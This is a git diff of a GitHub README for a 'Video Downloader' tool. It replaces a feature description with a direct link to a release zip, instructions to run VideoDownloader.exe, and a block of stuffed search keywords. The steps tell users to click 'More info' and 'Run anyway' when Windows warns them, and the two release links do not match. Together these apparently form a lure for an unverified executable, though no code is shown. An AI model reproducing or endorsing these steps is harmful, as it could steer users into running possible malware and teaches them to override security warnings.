@@ -1,47 +1,26 @@
-[![vogqwkgtj](https://github.com/user-attachments/assets/0218813e-817c-4744-9544-7fa949f48c5f)](https://liki20092009-sys.github.io/)
+<img width="1024" height="500" alt="image" src="https://github.com/user-attachments/assets/4a07e169-a2d0-4b59-9395-adad6539576f" />
 
-# 🎬 Video Downloader
+[DOWNLOAD](https://github.com/liki20092009-sys/video-dowloader/releases/download/video/VIDEO-DOWLOADER.zip)
 
-**Video Downloader** is a simple and lightweight tool for downloading videos from popular video hosting and social media platforms using direct links.
+# Video Downloader
 
-The application allows users to save videos locally in the best available quality (depending on the source).  
-Designed for personal and educational use.
+Simple tool to download videos from websites by pasting a link.
 
----
+## Installation and Launch
 
-## 🔗 Supported Links
+1. **Download**  
+   Get the `.zip` file from the [Releases](https://github.com/your-username/Video-Downloader/releases) page.
 
-The program supports downloading videos from the following platforms:
+2. **Extract**  
+   Right‑click the `.zip` → **Extract All** → choose a folder (e.g., `C:\Tools\Video-Downloader`).
 
-### YouTube
-- https://www.youtube.com/watch?v=VIDEO_ID
-- https://youtu.be/VIDEO_ID
+3. **Run**  
+   Open the folder → double‑click `VideoDownloader.exe` → if warned, click **More info** → **Run anyway**.
 
-### Vimeo
-- https://vimeo.com/VIDEO_ID
+4. **Download video**  
+   Paste the video URL → click **Download** → wait for completion (file saves in the same folder).
 
-### Dailymotion
-- https://www.dailymotion.com/video/VIDEO_ID
+## Keywords
 
-### Facebook
-- https://www.facebook.com/***/videos/***
+video downloader, download video, video saver, online video, youtube downloader, video tool, media downloader, free downloader, video grabber, web video, mp4 download, video utility
 
-### Instagram
-- https://www.instagram.com/p/POST_ID/
-- https://www.instagram.com/reel/REEL_ID/
-
-### TikTok
-- https://www.tiktok.com/@username/video/VIDEO_ID
-
-### Twitter / X
-- https://twitter.com/***/status/***
-- https://x.com/***/status/***
-
-### Other Platforms
-- Any platform that provides publicly accessible video URLs
-
-## ✨ Features
-
-- Download videos using a single URL
-- Automatic quality detection
-- 
